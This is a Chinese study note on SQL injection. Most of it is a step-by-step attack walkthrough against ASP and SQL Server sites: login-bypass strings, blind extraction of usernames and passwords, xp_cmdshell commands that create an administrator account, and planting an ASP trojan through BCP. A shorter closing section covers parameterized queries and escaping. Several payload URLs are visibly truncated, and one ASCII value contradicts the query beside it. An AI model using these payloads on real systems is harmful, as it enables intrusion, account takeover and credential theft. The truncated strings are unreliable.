# sql注入
> sql注入基本原理以及如何防止注入

## **参考网站**

[百度百科](http://baike.baidu.com/link?url=xUgOoaAtYfelRAMnec_Qfkb1wB0Nrzq1QZtuMgQDsCBmcZeQrGIPnirF9cZDeTALExmKXG830TBDd3o5_GzOq_)

[link1](http://www.cnblogs.com/tanshuicai/archive/2010/02/03/1664900.html)

[link2](http://blog.csdn.net/agoago_2009/article/details/37884797)

[link3](http://www.cnblogs.com/heyuquan/archive/2012/10/31/2748577.html)

[link4](http://www.jb51.net/article/29444.htm)

[link5](http://blog.csdn.net/stilling2006/article/details/8526458)

## sql注入定义
很多应用程序都使用数据库来存储信息。SQL命令就是前端应用程序和后端数据库之间的接口。攻击者可利用应用程序根据提交的数据动态生成SQL命令的特性，在URL、表单域，或者其他的输入域中输入自己的SQL命令，改变SQL命令的操作，将被修改的SQL命令注入到后端数据库引擎执行。
### sql注入的一个实例
某个网站的登录验证的SQL查询代码为：


```
strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"
```

恶意填入
```
userName = "1' OR '1'='1";
```
与
```
passWord = "1' OR '1'='1";
```

时，将导致原本的SQL字符串被填为
```
strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"
```
也就是实际上运行的SQL命令会变成下面这样的

```
strSQL = "SELECT * FROM users;"
```

因此达到无账号密码，亦可登录网站。所以SQL注入攻击被俗称为黑客的填空游戏。

## sql注入的危害（包括但不限于）
1. 数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。
1. 网页篡改：通过操作数据库对特定网页进行篡改。
1. 网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。
1. 数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。
1. 服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。
1. 破坏硬盘数据，瘫痪全系统。
1. 一些类型的数据库系统能够让SQL指令操作文件系统，这使得SQL注入的危害被进一步放大。

## SQL注入攻击的总体思路
- 发现SQL注入位置；
- 判断后台数据库类型；
- 确定XP_CMDSHELL可执行情况
- 发现WEB虚拟目录
- 上传ASP木马；
- 得到管理员权限；
## SQL注入攻击的步骤
### 一、SQL注入漏洞的判断
一般来说，SQL注入一般存在于形如：HTTP://xxx.xxx.xxx/abc.asp?id=XX 等带有参数的ASP动态网页中，有时一个动态网页中可能只有一个参数，有时可能有N个参数，有时是整型参数，有时是字符串型参数，不能一概而论。总之只要是带有参数的动态网页且此网页访问了数据库，那么就有可能存在SQL注入。如果ASP程序员没有安全意识，不进行必要的字符过滤，存在SQL注入的可能性就非常大。


　　为了把问题说明清楚，以下以HTTP://xxx.xxx.xxx/abc.asp?p=YY为例进行分析，YY可能是整型，也有可能是字符串。
#### 1. 整型参数的判断
当输入的参数YY为整型时，通常abc.asp中SQL语句原貌大致如下：
select * from 表名 where 字段=YY，所以可以用以下步骤测试SQL注入是否存在。

1. HTTP://xxx.xxx.xxx/abc.asp?p=YY’(附加一个单引号)，此时abc.ASP中的SQL语句变成了
select * from 表名 where 字段=YY’，abc.asp运行异常；

2. HTTP://xxx.xxx.xxx/abc.asp?p=YY and 1=1, abc.asp运行正常，而且与HTTP://xxx.xxx.xxx/abc.asp?p=YY运行结果相同；

3. HTTP://xxx.xxx.xxx/abc.asp?p=YY and 1=2, abc.asp运行异常；

如果以上三步全面满足，abc.asp中一定存在SQL注入漏洞。
#### 2. 字符串型参数的判断
当输入的参数YY为字符串时，通常abc.asp中SQL语句原貌大致如下：


```
select * from 表名 where 字段='YY'
```
所以可以用以下步骤测试SQL注入是否存在。

- HTTP://xxx.xxx.xxx/abc.asp?p=YY’(附加一个单引号)，此时abc.ASP中的SQL语句变成了
select * from 表名 where 字段=YY’，abc.asp运行异常；

- HTTP://xxx.xxx.xxx/abc.asp?p=YY&nb ... 39;1'='1', abc.asp运行正常，而且与HTTP://xxx.xxx.xxx/abc.asp?p=YY运行结果相同；

- HTTP://xxx.xxx.xxx/abc.asp?p=YY&nb ... 39;1'='2', abc.asp运行异常；

如果以上三步全面满足，abc.asp中一定存在SQL注入漏洞。

#### 3. 特殊情况的处理
有时ASP程序员会在程序员过滤掉单引号等字符，以防止SQL注入。此时可以用以下几种方法试一试。

- 大小定混合法：由于VBS并不区分大小写，而程序员在过滤时通常要么全部过滤大写字符串，要么全部过滤小写字符串，而大小写混合往往会被忽视。如用SelecT代替select,SELECT等；

- UNICODE法：在IIS中，以UNICODE字符集实现国际化，我们完全可以IE中输入的字符串化成UNICODE字符串进行输入。如+ =%2B，空格=%20 等；URLEncode信息参见附件一；

- ASCII码法：可以把输入的部分或全部字符全部用ASCII码代替，如U=chr(85),a=chr(97)等，ASCII信息参见附件二；

### 二、分析数据库服务器类型
　　一般来说，ACCESS与SQL－SERVER是最常用的数据库服务器，尽管它们都支持T－SQL标准，但还有不同之处，而且不同的数据库有不同的攻击方法，必须要区别对待。
#### 1、 利用数据库服务器的系统变量进行区分
　　SQL－SERVER有user,db_name()等系统变量，利用这些系统值不仅可以判断SQL-SERVER，而且还可以得到大量有用信息。如：
- HTTP://xxx.xxx.xxx/abc.asp?p=YY and user>0 不仅可以判断是否是SQL-SERVER，而还可以得到当前连接到数据库的用户名
- HTTP://xxx.xxx.xxx/abc.asp?p=YY&n ... db_name()>0 不仅可以判断是否是SQL-SERVER，而还可以得到当前正在使用的数据库名；

#### 2、利用系统表

　　ACCESS的系统表是msysobjects,且在WEB环境下没有访问权限，而SQL-SERVER的系统表是sysobjects,在WEB环境下有访问权限。对于以下两条语句：
- HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select count(\*) from sysobjects)>0
- HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select count(\*) from msysobjects)>0
若数据库是SQL-SERVE，则第一条，abc.asp一定运行正常，第二条则异常；若是ACCESS则两条都会异常。

#### 3、MSSQL三个关键系统表
　　sysdatabases系统表：Microsoft SQL Server 上的每个数据库在表中占一行。最初安装 SQL Server 时，sysdatabases 包含 master、model、msdb、mssqlweb 和 tempdb 数据库的项。该表只存储在 master 数据库中。 这个表保存在master数据库中，这个表中保存的是什么信息呢？这个非常重要。他是 保存了所有的库名,以及库的ID和一些相关信息。
　　这里我把对于我们有用的字段名称和相关说明给大家列出来。
- name //表示库的名字。
- dbid //表示库的ID，dbid从1到5是系统的。分别是：master、model、msdb、mssqlweb、tempdb 这五个库。用select * from master.dbo.sysdatabases 就可以查询出所有的库名。
- Sysobjects：SQL-SERVER的每个数据库内都有此系统表，它存放该数据库内创建的所有对象，如约束、默认值、日志、规则、存储过程等，每个对象在表中占一行。
- syscolumns：每个表和视图中的每列在表中占一行，存储过程中的每个参数在表中也占一行。该表位于每个数据库中。主要字段有：name ，id， colid ：分别是字段名称，表ID号，字段ID号，其中的 ID 是 刚上我们用sysobjects得到的表的ID号。用: 
```
select * from ChouYFD.dbo.syscolumns where id=123456789
```
 得到ChouYFD这个库中，表的ID是123456789中的所有字段列表。

### 三、确定XP_CMDSHELL可执行情况
　　若当前连接数据的帐号具有SA权限，且master.dbo.xp_cmdshell扩展存储过程(调用此存储过程可以直接使用操作系统的shell)能够正确执行，则整个计算机可以通过以下几种方法完全控制，以后的所有步骤都可以省
1. HTTP://xxx.xxx.xxx/abc.asp?p=YY&nb ... er>0 abc.asp执行异常但可以得到当前连接数据库的用户名(若显示dbo则代表SA)。
2. HTTP://xxx.xxx.xxx/abc.asp?p=YY ... me()>0 abc.asp执行异常但可以得到当前连接的数据库名。
3. HTTP://xxx.xxx.xxx/abc.asp?p=YY；exec master..xp_cmdshell “net user aaa bbb /add”-- (master是SQL-SERVER的主数据库；名中的分号表示SQL-SERVER执行完分号前的语句名，继续执行其后面的语句；“—”号是注解，表示其后面的所有内容仅为注释，系统并不执行)可以直接增加操作系统帐户aaa,密码为bbb。
4. HTTP://xxx.xxx.xxx/abc.asp?p=YY；exec master..xp_cmdshell “net localgroup administrators aaa /add”-- 把刚刚增加的帐户aaa加到administrators组中。
5. HTTP://xxx.xxx.xxx/abc.asp?p=YY；backuup database 数据库名 to disk='c:\inetpub\wwwroot\save.db' 则把得到的数据内容全部备份到WEB目录下，再用HTTP把此文件下载(当然首选要知道WEB虚拟目录)。
6. 通过复制CMD创建UNICODE漏洞
　　HTTP://xxx.xxx.xxx/abc.asp?p=YY;exe ... dbo.xp_cmdshell “copy c:\winnt\system32\cmd.exe c:\inetpub\scripts\cmd.exe” 便制造了一个UNICODE漏洞，通过此漏洞的利用方法，便完成了对整个计算机的控制(当然首选要知道WEB虚拟目录)。

### 四、发现WEB虚拟目录
只有找到WEB虚拟目录，才能确定放置ASP木马的位置，进而得到USER权限。有两种方法比较有效。

一是根据经验猜解，一般来说，WEB虚拟目录是：c:\inetpub\wwwroot; D:\inetpub\wwwroot; E:\inetpub\wwwroot等，而可执行虚拟目录是：c:\inetpub\scripts; D:\inetpub\scripts; E:\inetpub\scripts等。

二是遍历系统的目录结构，分析结果并发现WEB虚拟目录；
- 先创建一个临时表：temp
　　HTTP://xxx.xxx.xxx/abc.asp?p=YY;create&n ... mp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--
- 接下来：
    1.  利用xp_availablemedia来获得当前所有驱动器,并存入temp表中：
HTTP://xxx.xxx.xxx/abc.asp?p=YY;insert temp ... ter.dbo.xp_availablemedia;--
我们可以通过查询temp的内容来获得驱动器列表及相关信息
　　
    2. 利用xp_subdirs获得子目录列表,并存入temp表中：
HTTP://xxx.xxx.xxx/abc.asp?p=YY;insert into temp(i ... dbo.xp_subdirs 'c:\';--
    3. 利用xp_dirtree获得所有子目录的目录树结构,并寸入temp表中：
HTTP://xxx.xxx.xxx/abc.asp?p=YY;insert into temp(id,num1) exec master.dbo.xp_dirtree 'c:\';--

注意：
- 以上每完成一项浏览后，应删除TEMP中的所有内容，删除方法是：
HTTP://xxx.xxx.xxx/abc.asp?p=YY;delete from temp;--
- 浏览TEMP表的方法是：(假设TestDB是当前连接的数据库名)
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select top& ... nbsp;TestDB.dbo.temp )>0 得到表TEMP中第一条记录id字段的值，并与整数进行比较，显然abc.asp工作异常，但在异常中却可以发现id字段的值。假设发现的表名是xyz，则HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select top 1 id from ... ere id not in('xyz'))>0 得到表TEMP中第二条记录id字段的值。

### 五、上传ASP木马
　　所谓ASP木马，就是一段有特殊功能的ASP代码，并放入WEB虚拟目录的Scripts下，远程客户通过IE就可执行它，进而得到系统的USER权限，实现对系统的初步控制。上传ASP木马一般有两种比较有效的方法：
#### 1. 利用WEB的远程管理功能

许多WEB站点，为了维护的方便，都提供了远程管理的功能；也有不少WEB站点，其内容是对于不同的用户有不同的访问权限。为了达到对用户权限的控制，都有一个网页，要求用户名与密码，只有输入了正确的值，才能进行下一步的操作,可以实现对WEB的管理，如上传、下载文件，目录浏览、修改配置等。

因此，若获取正确的用户名与密码，不仅可以上传ASP木马，有时甚至能够直接得到USER权限而浏览系统，上一步的“发现WEB虚拟目录”的复杂操作都可省略。用户名及密码一般存放在一张表中，发现这张表并读取其中内容便解决了问题。以下给出两种有效方法。

　　
- A、 注入法：

    从理论上说，认证网页中会有型如：
　
```
select * from admin where username='XXX' and password='YYY'
```
 的语句，若在正式运行此句之前，没有进行必要的字符过滤，则很容易实施SQL注入。
　　如在用户名文本框内输入：abc’ or 1=1-- 在密码框内输入：123 则SQL语句变成：
　　
```
select * from admin where username='abc’ or 1=1 and password='123’
```
 不管用户输入任何用户名与密码，此语句永远都能正确执行，用户轻易骗过系统，获取合法身份。

- B、猜解法：
 
    基本思路是：猜解所有数据库名称，猜出库中的每张表名，分析可能是存放用户名与密码的表名，猜出表中的每个字段名，猜出表中的每条记录内容。
　　猜解所有数据库名称
　　
```
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select count(*) from master.dbo.sysdatabases where name>1 and dbid=6) <>0
```
因为 dbid 的值从1到5，是系统用了。所以用户自己建的一定是从6开始的。并且我们提交了 name>1 (name字段是一个字符型的字段和数字比较会出错),abc.asp工作异常，可得到第一个数据库名，同理把DBID分别改成7,8，9,10,11,12…就可得到所有数据库名。

##### 猜解数据库中用户名表的名称
以下假设得到的数据库名是TestDB。

###### 猜解法：
此方法就是根据个人的经验猜表名，一般来说，user,users,member,members,userlist,memberlist,userinfo,manager,admin,adminuser,systemuser,systemusers,sysuser,sysusers,sysaccounts,systemaccounts等。并通过语句进行判断
　
```
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select count(*) from TestDB.dbo.表名)>0
```
 若表名存在，则abc.asp工作正常，否则异常。如此循环，直到猜到系统帐号表的名称。
　　
###### 读取法：
SQL-SERVER有一个存放系统核心信息的表sysobjects，有关一个库的所有表，视图等信息全部存放在此表中，而且此表可以通过WEB进行访问。

当xtype='U' and status>0代表是用户建立的表，发现并分析每一个用户建立的表及名称，便可以得到用户名表的名称，基本的实现方法是：

　　
```
①HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select top 1 name from TestD ... type='U' and status>0 )>0
```
得到第一个用户建立表的名称，并与整数进行比较，显然abc.asp工作异常，但在异常中却可以发现表的名称。假设发现的表名是xyz，则
　　
```
②HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select top 1 name from TestDB.dbo.sysobjects& ... tatus>0 and name not in('xyz'))>0
```
 可以得到第二个用户建立的表的名称，同理就可得到所有用建立的表的名称。
　　根据表的名称，一般可以认定那张表用户存放用户名及密码，以下假设此表名为Admin。

l. 猜解用户名字段及密码字段名称

admin表中一定有一个用户名字段，也一定有一个密码字段，只有得到此两个字段的名称，才有可能得到此两字段的内容。如何得到它们的名称呢，同样有以下两种方法。
- 猜解法：此方法就是根据个人的经验猜字段名，一般来说，用户名字段的名称常用：username,name,user,account等。而密码字段的名称常用：password,pass,pwd,passwd等。并通过语句进行判断
　　
```
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select count(字段名) from TestDB.dbo.admin)>0 “select count(字段名) from 表名”
```
语句得到表的行数，所以若字段名存在，则abc.asp工作正常，否则异常。如此循环，直到猜到两个字段的名称。
- 读取法：基本的实现方法是
　
```
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select ... me(object_id('admin'),1) from TestDB.dbo.sysobjects)>0
```
select top 1 col_name(object_id('admin'),1) from TestDB.dbo.sysobjects是从sysobjects得到已知表名的第一个字段名，当与整数进行比较，显然abc.asp工作异常，但在异常中却可以发现字段的名称。把col_name(object_id('admin'),1)中的1依次换成2,3,4,5，6…就可得到所有的字段名称。

l. 猜解用户名与密码

　　猜用户名与密码的内容最常用也是最有效的方法有：
- ASCII码逐字解码法:虽然这种方法速度较慢，但肯定是可行的。基本的思路是先猜出字段的长度，然后依次猜出每一位的值。猜用户名与猜密码的方法相同，以下以猜用户名为例说明其过程。

```
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select top&n ... nbsp;from TestDB.dbo.admin)=X(X=1,2，3,4，5，… n，username为用户名字段的名称，admin为表的名称)
```
若x为某一值i且abc.asp运行正常时，则i就是第一个用户名的长度。如：当输入
　　
```
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select top ... e) from TestDB.dbo.admin)=8时abc.asp
```
运行正常，则第一个用户名的长度为8
　　
```
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (sel ... ascii(substring(username,m,1)) from TestDB.dbo.admin)=n
```
(m的值在1到上一步得到的用户名长度之间，当m=1，2,3，…时猜测分别猜测第1,2,3,…位的值；n的值是1~9、a~z、A~Z的ASCII值，也就是1~128之间的任意值；admin为系统用户帐号表的名称)，若n为某一值i且abc.asp运行正常时，则i对应ASCII码就是用户名某一位值。如：当输入
　
```
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (sel ... ascii(substring(username,3,1)) from TestDB.dbo.admin)=80
```
时abc.asp运行正常，则用户名的第三位为P(P的ASCII为80)；
　
```
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (sel ... ascii(substring(username,9,1)) from TestDB.dbo.admin)=33
```
时abc.asp运行正常，则用户名的第9位为!(!的ASCII为80)；
　　猜到第一个用户名及密码后，同理，可以猜出其他所有用户名与密码。注意：有时得到的密码可能是经MD5等方式加密后的信息，还需要用专用工具进行脱密。或者先改其密码，使用完后再改回来，见下面说明。
- 简单法：猜用户名用
　　
```
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select top 1 ... o.admin where username>1)
```
 flag是admin表中的一个字段，username是用户名字段，此时abc.asp工作异常，但能得到Username的值。与上同样的方法，可以得到第二用户名，第三个用户等等，直到表中的所有用户名。
　　
猜用户密码：
```
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select top 1&nb ... B.dbo.admin where pwd>1)
```
flag是admin表中的一个字段，pwd是密码字段，此时abc.asp工作异常，但能得到pwd的值。与上同样的方法，可以得到第二用户名的密码，第三个用户的密码等等，直到表中的所有用户的密码。密码有时是经MD5加密的，可以改密码。
　
```
HTTP://xxx.xxx.xxx/abc.asp?p=YY;update TestDB.dbo.admin set pwd=' ... where username='www';-- ( 1的MD5值为：AAABBBCCCDDDEEEF，即把密码改成1；www为已知的用户名)
```

　　用同样的方法当然可把密码改原来的值。
#### 2、利用表内容导成文件功能
　　SQL有BCP命令，它可以把表的内容导成文本文件并放到指定位置。利用这项功能，我们可以先建一张临时表，然后在表中一行一行地输入一个ASP木马，然后用BCP命令导出形成ASP文件。
　　命令行格式如下：
　　bcp "select * from text..foo" queryout c:\inetpub\wwwroot\runcommand.asp –c –S localhost –U sa –P foobar ('S'参数为执行查询的服务器，'U'参数为用户名，'P'参数为密码，最终上传了一个runcommand.asp的木马)
### 六、得到系统的管理员权限
ASP木马只有USER权限，要想获取对系统的完全控制，还要有系统的管理员权限。怎么办？提升权限的方法有很多种：
- 上传木马，修改开机自动运行的.ini文件(它一重启，便死定了)；
- 复制CMD.exe到scripts，人为制造UNICODE漏洞；
- 下载SAM文件，破解并获取OS的所有用户名密码；
等等，视系统的具体情况而定，可以采取不同的方法。

### 七、几个SQL-SERVER专用手段
#### 1、利用xp_regread扩展存储过程修改注册表
　　[xp_regread]另一个有用的内置存储过程是xp_regXXXX类的函数集合(Xp_regaddmultistring，Xp_regdeletekey，Xp_regdeletevalue，Xp_regenumkeys，Xp_regenumvalues，Xp_regread，Xp_regremovemultistring，Xp_regwrite)。攻击者可以利用这些函数修改注册表，如读取SAM值，允许建立空连接，开机自动运行程序等。如：
　
```
exec xp_regread HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares'
```
 确定什么样的会话连接在服务器可用。
　
```
exec xp_regenumvalues HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities'
```
 显示服务器上所有SNMP团体配置，有了这些信息，攻击者或许会重新配置同一网络中的网络设备。
#### 2、利用其他存储过程去改变服务器
- xp_servicecontrol过程允许用户启动，停止服务。如：
- (exec master..xp_servicecontrol 'start','schedule'
- exec master..xp_servicecontrol 'start','server')
- Xp_availablemedia 显示机器上有用的驱动器
- Xp_dirtree 允许获得一个目录树
- Xp_enumdsn 列举服务器上的ODBC数据源
- Xp_loginconfig 获取服务器安全信息
- Xp_makecab 允许用户在服务器上创建一个压缩文件
- Xp_ntsec_enumdomains 列举服务器可以进入的域
- Xp_terminate_process 提供进程的进程ID，终止此进程

## 防止SQL注入
### 1.Use prepared statements and parameterized queries.
SQL语句和查询的参数分别发送给数据库服务器进行解析。这种方式有2种实现：

（1）使用PDO（PHP data object）

```
$stmt = $pdo->prepare('SELECT * FROM employees WHERE name = :name');  
$stmt->execute(array('name' => $name));  
foreach ($stmt as $row) {  
    // do something with $row  
}
```


（2）使用MySQLi
    
```
$stmt = $dbConnection->prepare('SELECT * FROM employees WHERE name = ?');  
$stmt->bind_param('s', $name);  
$stmt->execute();  
$result = $stmt->get_result();  
while ($row = $result->fetch_assoc()) {  
    // do something with $row  
}
```

### 2.对查询语句进行转义（最常见的方式）


```
$unsafe_variable = $_POST["user-input"];  
$safe_variable = mysql_real_escape_string($unsafe_variable);  
mysql_query("INSERT INTO table (column) VALUES ('" . $safe_variable . "')");
```
 

Warning:
As of PHP 5.5.0 mysql_real_escape_string and the mysql extension are deprecated. Please use mysqli extension and mysqli::escape_string function instead 




```
$mysqli = new mysqli("server", "username", "password", "database_name");  
// TODO - Check that connection was successful.  
$unsafe_variable = $_POST["user-input"];  
$stmt = $mysqli->prepare("INSERT INTO table (column) VALUES (?)");  
// TODO check that $stmt creation succeeded  
// "s" means the database expects a string  
$stmt->bind_param("s", $unsafe_variable);  
$stmt->execute();  
$stmt->close();  
$mysqli->close();
```


### 3.限制引入的参数

在CODE上查看代码片派生到我的代码片


```
$orders  = array("name","price","qty"); //field names  
$key     = array_search($_GET['sort'],$orders)); // see if we have such a name  
$orderby = $orders[$key]; //if not, first one will be set automatically. smart enuf :)  
$query   = "SELECT * FROM `table` ORDER BY $orderby"; //value is safe
```


### 4.对引入参数进行编码

在CODE上查看代码片派生到我的代码片


```
SELECT password FROM users WHERE name = 'root'            --普通方式  
SELECT password FROM users WHERE name = 0x726f6f74        --防止注入  
SELECT password FROM users WHERE name = UNHEX('726f6f74') --防止注入  
      
set @INPUT =  hex("%实验%");  
select * from login where reset_passwd_question like unhex(@INPUT) ;
```
  

There was some discussion in comments, so I finally want to make it clear. These two approaches are very similar, but they are a little different in some ways:
0x prefix can only be used on data columns such as char, varchar, text, block, binary, etc.
Also its use is a little complicated if you are about to insert an empty string. You'll have to entirely replace it with '', or you'll get an error.
UNHEX() works on any column; you do not have to worry about the empty string.
### 5.使用MySQL存储过程
其他：验证输入参数
http://stackoverflow.com/questions/60174/how-can-i-prevent-sql-injection-in-php
http://stackoverflow.com/questions/18026088/pdo-sends-raw-query-to-mysql-while-mysqli-sends-prepared-query-both-produce-the

# PDO防注入

PDO使用prepart，bindpram,execute 防注入详见 [PDO使用](http://note.youdao.com/group/#/25421335/md/100011154?full) 文档

***@editor： siluzhou***






